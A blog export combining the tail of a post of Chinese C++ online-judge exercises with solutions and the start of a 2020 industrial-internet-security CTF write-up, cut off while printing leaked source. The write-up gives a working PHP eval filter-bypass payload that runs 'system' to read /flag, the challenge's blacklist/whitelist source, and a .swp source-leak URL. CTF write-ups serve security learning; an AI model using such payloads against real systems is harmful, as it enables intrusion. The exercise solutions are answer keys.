<p>   a += b    表示串a中的字符是a和b的连接：串b中的内容不变</p>
<p>-—————————————————————————-</p>
<p>你设计一个字符串类STR，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。</p>
<p>-—————————————————————————-</p>
<p>Invalid Word（禁用单词）错误：“string”、“vector”等被禁用。</p>
<h2 id="Input-42"><a href="#Input-42" class="headerlink" title="Input"></a>Input</h2><p>输入有若干行，每行一个字符串。</p>
<h2 id="Output-42"><a href="#Output-42" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应输出一行，包含两部分内容，首先是一个整数，表示输入串的长度，然后是输入的字符串，两者用一个空格分开。格式见sample。</p>
<h2 id="Sample-Input-42"><a href="#Sample-Input-42" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>A123456789</p>
<h2 id="Sample-Output-42"><a href="#Sample-Output-42" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>12 Hello World!0 12 Hello World!12 Hello World!12 Hello World!10 A1234567891 A9 12345678910 123456789A1 A</p>
<h2 id="HINT-42"><a href="#HINT-42" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-42"><a href="#Append-Code-42" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1579&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code></code></pre>
<h3 id="44-数组类（I）"><a href="#44-数组类（I）" class="headerlink" title="44.数组类（I）"></a>44.数组类（I）</h3><blockquote>
<h2 id="Description-43"><a href="#Description-43" class="headerlink" title="Description"></a>Description</h2><p>封装一个整型数组类，用于存储整数和处理的相关功能，支持以下操作：</p>
<p>\1. Array::Array()无参构造方法：创建一个空数组对象。</p>
<p>\2. Array::size()方法：返回Array对象中元素个数。</p>
<p>\3. Array::get(int n)方法：按格式从输入读取n元素。</p>
<p>\4. 下标运算符：返回下标所指的元素。</p>
<p>-—————————————————————————-</p>
<p>你设计一个数组类Array，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数</p>
<h2 id="Input-43"><a href="#Input-43" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据。</p>
<p>后面的每行以一个整数k开头，表示后面有k个整数。</p>
<h2 id="Output-43"><a href="#Output-43" class="headerlink" title="Output"></a>Output</h2><p>把输入的数组，输出出来。每行数据对应一个输出。格式见sample。</p>
<h2 id="Sample-Input-43"><a href="#Sample-Input-43" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>42 10 201 003 1 2 3</p>
<h2 id="Sample-Output-43"><a href="#Sample-Output-43" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>10 2001 2 3</p>
<h2 id="HINT-43"><a href="#HINT-43" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-43"><a href="#Append-Code-43" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1572&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;vector&gt;
#include &lt;string&gt;
using namespace std;
class Array&#123;
public:
    vector&lt;int&gt; a;
    int l;
    Array():l(0)&#123;&#125;
    int size()&#123;return l;&#125;
    void get(int n)&#123;
        l=n;a.resize(n);
        for(int i=0;i&lt;n;i++)&#123;
            int x;
            cin &gt;&gt; x;
            a[i]=x;
        &#125;
    &#125;
    int operator[](int x)&#123;return a[x];&#125;
&#125;;
//////////////////////////////////////////
int main()
&#123;
    int cases;
    Array arr;
    cin &gt;&gt; cases;
    for(int ca = 1; ca &lt;= cases; ca++)
    &#123;
        int len;
        cin &gt;&gt; len;
        arr.get(len);
        for(int i = 0; i &lt; arr.size(); i++)
            if(i + 1 == arr.size())
                cout &lt;&lt; arr[i];
            else
                cout &lt;&lt; arr[i] &lt;&lt; &quot; &quot;;
        cout &lt;&lt; endl;
    &#125;
&#125;
</code></pre>
<h3 id="45-数组类（II）"><a href="#45-数组类（II）" class="headerlink" title="45.数组类（II）"></a>45.数组类（II）</h3><blockquote>
<h2 id="Description-44"><a href="#Description-44" class="headerlink" title="Description"></a>Description</h2><p>封装一个模板数组类，用于存储数组和处理的相关功能，支持以下操作：</p>
<p>\1. Array::Array(int l)构造方法：创建一个长度为l的组对象。</p>
<p>\2. Array::size()方法：返回Array对象中元素个数。</p>
<p>\3. Array::put(int n)方法：按从大到小的顺序输出前n大元素，若数组长度小于n则从大到小输出全部元素。</p>
<p>\4. 下标运算符：返回下标所指的元素。</p>
<p>-—————————————————————————-</p>
<p>你设计一个模板数组类Array，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。</p>
<h2 id="Input-44"><a href="#Input-44" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据。</p>
<p>后面的每行以一个整数k开头，表示后面有k个同类型的数组元素。</p>
<p>数组元素有以下三种类型：整数、浮点数和字符，并且按固定的次序间隔出现。</p>
<h2 id="Output-44"><a href="#Output-44" class="headerlink" title="Output"></a>Output</h2><p>把输入的数组，按值从大到小输出前10个元素，若输入不足10个则全部输出。每行数据对应一个输出。格式见sample。</p>
<h2 id="Sample-Input-44"><a href="#Sample-Input-44" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>310 1 2 3 4 5 6 7 8 9 05 1.1 2.2 3.3 4.4 5.520 ABCDEGHIJMNPRSTUVWXY</p>
<h2 id="Sample-Output-44"><a href="#Sample-Output-44" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>9 8 7 6 5 4 3 2 1 05.5 4.4 3.3 2.2 1.1Y X W V U T S R P N</p>
<h2 id="HINT-44"><a href="#HINT-44" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-44"><a href="#Append-Code-44" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1573&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include&lt;iostream&gt;  
using namespace std;  
template&lt;class T&gt;  
class Array  
&#123;  
private:  
    T *sss;  
    int si;  
public:  
    Array(int l):si(l)&#123;sss=new T[si];&#125;  
    ~Array()&#123;if (sss!=NULL)delete []sss;&#125;  
    int size()&#123;return si;&#125;  
    void put(int n)  
    &#123;  
        int i,j;  
        for(i=0;i&lt;si-1;i++)//挨着和每个比，最后一个不用了  
        &#123;  
            for(j=i+1;j&lt;si;j++)//从下一个开始，到最后  
            &#123;  
                if(sss[i]&lt;sss[j])  
                &#123;  
                    T t=sss[i];  
                    sss[i]=sss[j];  
                    sss[j]=t;  
                &#125;  
            &#125;  
        &#125;  
        if(n&gt;si)  
        n=si;  
            cout&lt;&lt;sss[0];  
        for(int i=1;i&lt;n;i++)  
            cout&lt;&lt;&quot; &quot;&lt;&lt;sss[i];  
        cout&lt;&lt;endl;  
    &#125;  
    T&amp; operator[](int n)//少个引用，我去  
    &#123;  
        return sss[n];  
    &#125;  
&#125;; 
//////////////////////////////////////////
int main()
&#123;
    int cases, len;
    cin &gt;&gt; cases;
    for(int ca = 1; ca &lt;= cases; ca++)
    &#123;
        cin &gt;&gt; len;
        if(ca % 3 == 0)
        &#123;
            Array&lt;char&gt; chr_arr(len);
            for(int i = 0; i &lt; chr_arr.size(); i++)
                cin &gt;&gt; chr_arr[i];
            chr_arr.put(10);
        &#125;
        if(ca % 3 == 1)
        &#123;
            Array&lt;int&gt; int_arr(len);
            for(int i = 0; i &lt; int_arr.size(); i++)
                cin &gt;&gt; int_arr[i];
            int_arr.put(10);
        &#125;
        if(ca % 3 == 2)
        &#123;
            Array&lt;double&gt; dbl_arr(len);
            for(int i = 0; i &lt; dbl_arr.size(); i++)
                cin &gt;&gt; dbl_arr[i];
            dbl_arr.put(10);
        &#125;
    &#125;
&#125;
</code></pre>
<h3 id="46-Problem-E-农夫果园"><a href="#46-Problem-E-农夫果园" class="headerlink" title="46.Problem E: 农夫果园"></a>46.Problem E: 农夫果园</h3><blockquote>
<h2 id="Description-45"><a href="#Description-45" class="headerlink" title="Description"></a>Description</h2><p>秋天到了，果园里的水果成熟了，商贩们来收水果了，农夫们都希望自己的水果能卖个好价钱。</p>
<p>现在果园里有三种水果正在销售，苹果（Apple）、香蕉（Banana）、梨（Pear）。每次销售都会记录下水果的种类、单价和总量，input()函数可以读取每条销售记录的单价和总量，total()函数可以计算出这次销售的总价。</p>
<p>但是，销售员在记录时忙中出错，各中水果的单价和总量的单位没有统一。单价是每公斤的价格，而水果是按箱记录的。其中，苹果一箱按30公斤计算，香蕉一箱按25公斤计算，梨一箱按20公斤计算。每种水果每次销售的总价是“单价<em>总量</em>每箱公斤数”。</p>
<p>现在，你来设计一个程序帮忙计算果园卖出水果的总价。由于total()函数对每种水果的计算方式都不一样，因此使用多态来实现。</p>
<p>-—————————————————————————-</p>
<p>你设计并实现这个水果类的派生体系，使得main()函数能够运行并得到正确的输出。调用格式见append.cc</p>
<h2 id="Input-45"><a href="#Input-45" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示后面有n条水果收购的记录。每条记录分为3部分，水果种类、单价和总量。</p>
<h2 id="Output-45"><a href="#Output-45" class="headerlink" title="Output"></a>Output</h2><p>输出为一行，表示整个果园卖出水果的总价。</p>
<h2 id="Sample-Input-45"><a href="#Sample-Input-45" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>5Apple 4.2 100Banana 8.8 50Apple 4.5 200Banana 7.8 100Pear 3.7 100</p>
<h2 id="Sample-Output-45"><a href="#Sample-Output-45" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Total Price : 77500</p>
<h2 id="HINT-45"><a href="#HINT-45" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-45"><a href="#Append-Code-45" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=0&pid=1670&getkey=">append.c</a>, <a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1670&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include&lt;iostream&gt;
using namespace std;
class Fruit&#123;
public:
    string name;
    double per;
    int n;
    Fruit()&#123;&#125;
    Fruit(string n):name(n)&#123;&#125;
    void input()&#123;cin&gt;&gt;per&gt;&gt;n;&#125;
    virtual double total()=0;
&#125;;
class Apple:public Fruit&#123;
public:
    string name;
    ///double per;
    ///int n;
    Apple():name(&quot;Apple&quot;)&#123;&#125;
    double total()&#123;return per*n*30;&#125;
&#125;;
class Banana:public Fruit&#123;
public:
    string name;
    ///double per;
    ///int n;
    Banana():name(&quot;Banana&quot;)&#123;&#125;
    double total()&#123;return per*n*25;&#125;
&#125;;
class Pear:public Fruit&#123;
public:
    string name;
    ///double per;
    ///int n;
    Pear():name(&quot;Pear&quot;)&#123;&#125;
    double total()&#123;return per*n*20;&#125;
&#125;;
int main()
&#123;
    Fruit* fruit;
    string fruit_name;
    double sum = 0.0;
    int cases;
    cin &gt;&gt; cases;
    for(int i = 1; i &lt;= cases; i++)
    &#123;
        cin &gt;&gt; fruit_name;
        if(fruit_name == &quot;Apple&quot;)
            fruit = new Apple();
        if(fruit_name == &quot;Banana&quot;)
            fruit = new Banana();
        if(fruit_name == &quot;Pear&quot;)
            fruit = new Pear();
        fruit-&gt;input();
        sum += fruit-&gt;total();
        delete fruit;
    &#125;
    cout &lt;&lt; &quot;Total Price : &quot; &lt;&lt; sum &lt;&lt; endl;

     return 0;
&#125;</code></pre>
<h3 id="47-一元二次方程类"><a href="#47-一元二次方程类" class="headerlink" title="47.一元二次方程类"></a>47.一元二次方程类</h3><blockquote>
<h2 id="Description-46"><a href="#Description-46" class="headerlink" title="Description"></a>Description</h2><p>定义一个表示一元二次方程的类Equation，该类至少具有以下3个数据成员：a、b和c，用于表示方程“a<em>x</em>x + b*x +c = 0”。同时，该类还至少具有以下两个成员函数：</p>
<p>\1. void solve()：用于求方程的根。</p>
<p>\2. void printRoot()：用于输出方程的根。</p>
<p>设定：</p>
<p>\1. 所有输入的a、b、c所生成的方程必定有个2个不同的实根。</p>
<p>\2. 输出的两个根按照从大到小的顺序输出，两个根之间用一个空格隔开，而且每个根必须且仅能保留2位小数，即使小数部分为0。</p>
<p>\3. 请根据样例和给出的main()函数定义相应的构造函数。</p>
<h2 id="Input-46"><a href="#Input-46" class="headerlink" title="Input"></a>Input</h2><p>输入有若干行，每行有3个实数，分别为方程“a<em>x</em>x + b*x + c = 0”中的系数a、b、c。</p>
<h2 id="Output-46"><a href="#Output-46" class="headerlink" title="Output"></a>Output</h2><p>按照题目要求中的设定条件2输出方程的根。</p>
<h2 id="Sample-Input-46"><a href="#Sample-Input-46" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1 3 2</p>
<h2 id="Sample-Output-46"><a href="#Sample-Output-46" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>-1.00 -2.00</p>
<h2 id="HINT-46"><a href="#HINT-46" class="headerlink" title="HINT"></a>HINT</h2><p>可以使用fixed和setprecision()来实现输出固定小数位数的数值。</p>
<h2 id="Append-Code-46"><a href="#Append-Code-46" class="headerlink" title="Append Code"></a>Append Code</h2><p>[append.cc](./Problem B_ 一元二次方程类_files/Source Code.html),</p>
</blockquote>
<pre><code>
#include &lt;iostream&gt;
#include &lt;iomanip&gt;
#include &lt;math.h&gt;
using namespace std;
class Equation
&#123;
private :
    double a,b,c,x1,x2;
   public:
     Equation(double x,double y,double z)
     &#123;
         a = x;b = y; c = z;
     &#125;
     void solve ()
     &#123;

         x1 = (-b+sqrt(b*b-4*a*c))/(2*a);
         x2 = (-b-sqrt(b*b-4*a*c))/(2*a);
     &#125;
    void printRoot()
    &#123;
       //cout.precision(3);
       cout&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(2)&lt;&lt;x1&lt;&lt;&quot; &quot;&lt;&lt;x2&lt;&lt;endl;
    &#125;
&#125;;</code></pre>
<blockquote>
<pre><code>setiosflags(ios::fixed)是用定点方式表示实数。 
使用setprecision(n)可控制输出流显示浮点数的数字个数。C++默认的流输出数值有效位是6。
如果setprecision(n)与setiosflags(ios::fixed)合用，可以控制小数点右边的数字个数。</code></pre>
</blockquote>
<h3 id="48-字符类的封装"><a href="#48-字符类的封装" class="headerlink" title="48.字符类的封装"></a>48.字符类的封装</h3><blockquote>
<h2 id="Description-47"><a href="#Description-47" class="headerlink" title="Description"></a>Description</h2><p>先来个简单习题，练练手吧！现在需要你来编写一个Character类，将char这一基本数据类型进行封装。该类中需要有如下成员函数：</p>
<p>\1. 无参构造函数。</p>
<p>\2. 构造函数Character(char)：用参数初始化数据成员。</p>
<p>\3. void setCharacter(char)：重新设置字符值。</p>
<p>\4. int getAsciiCode()：返回字符的ASII码。</p>
<p>\5. char getCharacter()：返回字符值。</p>
<p>\6. 析构函数。</p>
<h2 id="Input-47"><a href="#Input-47" class="headerlink" title="Input"></a>Input</h2><p>输入只有1行，包含一个合法的、可打印的字符。</p>
<h2 id="Output-47"><a href="#Output-47" class="headerlink" title="Output"></a>Output</h2><p>输出有好多行，请参考样例来编写相应的函数。</p>
<h2 id="Sample-Input-47"><a href="#Sample-Input-47" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>c</p>
<h2 id="Sample-Output-47"><a href="#Sample-Output-47" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Default constructor is called!Character a is created!ch1 is c and its ASCII code is 99.ch2 is a and its ASCII code is 97.Character a is erased!Character c is erased!</p>
<h2 id="HINT-47"><a href="#HINT-47" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-47"><a href="#Append-Code-47" class="headerlink" title="Append Code"></a>Append Code</h2><p>[append.cc](./Problem D_ 字符类的封装_files/Source Code.html),</p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Character&#123;
public:
    char c;
    Character()&#123;cout &lt;&lt; &quot;Default constructor is called!&quot; &lt;&lt; endl;&#125;
    Character(char cc):c(cc)&#123;cout &lt;&lt; &quot;Character &quot; &lt;&lt; c &lt;&lt; &quot; is created!&quot; &lt;&lt; endl;&#125;
    void setCharacter(char cc)&#123;c=cc;&#125;
    int getAsciiCode()&#123;return (int)c;&#125;
    char getCharacter()&#123;return c;&#125;
    ~Character()&#123;cout &lt;&lt; &quot;Character &quot; &lt;&lt; c &lt;&lt; &quot; is erased!&quot; &lt;&lt; endl;&#125;
&#125;;
///////////////////
int main()
&#123;
    char ch;
    Character ch1, ch2(&#39;a&#39;);
    cin&gt;&gt;ch;
    ch1.setCharacter(ch);
    cout&lt;&lt;&quot;ch1 is &quot;&lt;&lt;ch1.getCharacter()&lt;&lt;&quot; and its ASCII code is &quot;&lt;&lt;ch1.getAsciiCode()&lt;&lt;&quot;.&quot;&lt;&lt;endl;
    cout&lt;&lt;&quot;ch2 is &quot;&lt;&lt;ch2.getCharacter()&lt;&lt;&quot; and its ASCII code is &quot;&lt;&lt;ch2.getAsciiCode()&lt;&lt;&quot;.&quot;&lt;&lt;endl;
    return 0;
&#125;
</code></pre>
<blockquote>
<p>33/42</p>
</blockquote>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>other</tag>
      </tags>
  </entry>
  <entry>
    <title>2020工业互联网安全学生组初赛WP</title>
    <url>/2020/10/25/2020-gong-ye-hu-lian-wang-an-quan-xue-sheng-zu-chu-sai-wp/</url>
    <content><![CDATA[<blockquote>
<p>Web题AK了可是没有二进制选手，蓝瘦啊QAQ</p>
</blockquote>
<blockquote>
<p> 比赛题目都存了一份打包上传了，链接如下：</p>
<p>链接: <a href="https://pan.baidu.com/s/14Eo7f5AnAVzM5k8sn9e_JQ" target="_blank" rel="noopener">https://pan.baidu.com/s/14Eo7f5AnAVzM5k8sn9e_JQ</a>  密码: mi5q</p>
</blockquote>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="新型计算器"><a href="#新型计算器" class="headerlink" title="新型计算器"></a>新型计算器</h3><p>题目就只有一个输入框，按照页面提示是个数学计算的功能，支持PHP中的数学函数和三角函数，那么思路应该就是利用数学函数或者异或等来拼接出想要的内容来执行命令。</p>
<p>题目类似国赛的Love Math，但是经过测试过滤了挺多的函数的，还是有些差别。</p>
<p>经过测试三角函数可以使用，那么方向就是：调用数学函数逐步拼凑出<code>$_GET/$_POST</code>或者通过异或得到<code>$__GET/$_POST</code></p>
<p>这里被ban的函数有点多，base_convert和dechex都被ban掉了，那么通过异或来拼凑。</p>
<p>payload：</p>
<pre><code>http://eci-2zefjdda0snqnakjsw9m.cloudeci1.ichunqiu.com/flag.php?search=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag</code></pre><p>flag:</p>
<pre><code>flag{11cda751-7e87-49da-8006-e2fd23c5fe49}</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/1.jpg" alt=""></p>
<p>PS：读到的flag.php的源码</p>
<pre class=" language-php"><code class="language-php"><span class="token punctuation">{</span> <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string">"string:"</span><span class="token punctuation">.</span><span class="token string">"00000000000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string">"string:"</span><span class="token punctuation">.</span><span class="token string">"111111111111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token operator">*</span><span class="token operator">/</span> <span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Smarty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'search'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'search'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token string">"1+1"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* if(filter($ip)) { $smarty->display("string:"."00000000000"); die("0000000000000000"); } */</span> <span class="token comment" spellcheck="true">//$your_ip = $smarty->display("string:".$ip); echo "</span>
计算结果 <span class="token punctuation">:</span> <span class="token string">"; if (strlen($content) >= 80) { die("</span>你的输入也太长了吧<span class="token operator">=</span> <span class="token operator">=</span><span class="token string">"); } $specialchars = [' ', '\t', '\r', '\n','\'', '"</span><span class="token string">', '</span>`<span class="token string">']; foreach ($specialchars as $cc) { if (preg_match('</span><span class="token operator">/</span><span class="token string">' . $cc . '</span><span class="token operator">/</span>m<span class="token string">', $content)) { die("想啥呢= =输这种奇奇怪怪的字符"); } } $whitelist = [ '</span>is_finite<span class="token string">','</span>deg2rad<span class="token string">', '</span>mt_getrandmax<span class="token string">','</span>is_infinite<span class="token string">','</span>log10<span class="token string">' ]; $whitelist1=['</span>pi<span class="token string">', '</span>pow<span class="token string">', '</span>rad2deg<span class="token string">', '</span>rand<span class="token string">', '</span>round<span class="token string">', '</span>sin<span class="token string">', '</span>sinh<span class="token string">', '</span>sqrt<span class="token string">', '</span>srand<span class="token string">', '</span>cos<span class="token string">', '</span>cosh<span class="token string">', '</span>decbin<span class="token string">' , '</span>tan<span class="token string">', '</span>tanh<span class="token string">']; $whitelist = array_merge($whitelist, $whitelist1); $whitelist1 =['</span>expm1<span class="token string">', '</span>floor<span class="token string">', '</span>fmod<span class="token string">', '</span>acosh<span class="token string">', '</span>getrandmax<span class="token string">', '</span>asin<span class="token string">', '</span>asinh<span class="token string">', '</span>decoct<span class="token string">', '</span>atan2<span class="token string">', '</span>atan<span class="token string">', '</span>atanh<span class="token string">']; $whitelist = array_merge($whitelist, $whitelist1); $whitelist1 =['</span>lcg_value<span class="token string">', '</span>min<span class="token string">', '</span>acos<span class="token string">','</span>log1p<span class="token string">', '</span>log<span class="token string">', '</span>max<span class="token string">', '</span>is_nan<span class="token string">', '</span>mt_srand<span class="token string">', '</span>octdec<span class="token string">']; $whitelist = array_merge($whitelist, $whitelist1); $whitelist1= ['</span>bindec<span class="token string">', '</span>ceil<span class="token string">', '</span>hexdec<span class="token string">', '</span>hypot<span class="token string">','</span>mt_rand<span class="token string">','</span>exp<span class="token string">']; $whitelist = array_merge($whitelist, $whitelist1); preg_match_all('</span><span class="token operator">/</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span><span class="token constant">Z_</span><span class="token punctuation">]</span><span class="token punctuation">[</span>a<span class="token operator">-</span>zA<span class="token operator">-</span><span class="token constant">Z_0</span><span class="token number">-9</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token operator">/</span><span class="token string">', $content, $extractfunc); foreach ($extractfunc[0] as $ee) { if (!in_array($ee, $whitelist)) { die("想啥呢= = $ee 这个数学函数不支持"); } } $output=eval('</span><span class="token keyword">echo</span> <span class="token string">'.$content.'</span><span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string">"string:"</span><span class="token punctuation">.</span>
<span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> "
"<span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
<h3 id="SQLManager"><a href="#SQLManager" class="headerlink" title="SQLManager"></a>SQLManager</h3><p>页面简单实现了sqlite数据库的管理，实现的功能只有table的创建，展示，record的插入。</p>
<p>存在源码泄漏：</p>
<pre><code>view-source:http://eci-2zeiqyu2obvakg4ee0sx.cloudeci1.ichunqiu.com/.index.php.swp</code></pre><p>拿到源码如下：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'util.php'</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$method</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'GET'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token string">'build'</span><span class="token punctuation">,</span> <span class="token string">'modify'</span><span class="token punctuation">,</span> <span class="token string">'remove'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'flash'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'flash'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'modify'</span><span class="token punctuation">,</span> <span class="token string">'remove'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">"Please build database first."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">'sqlite:db/'</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
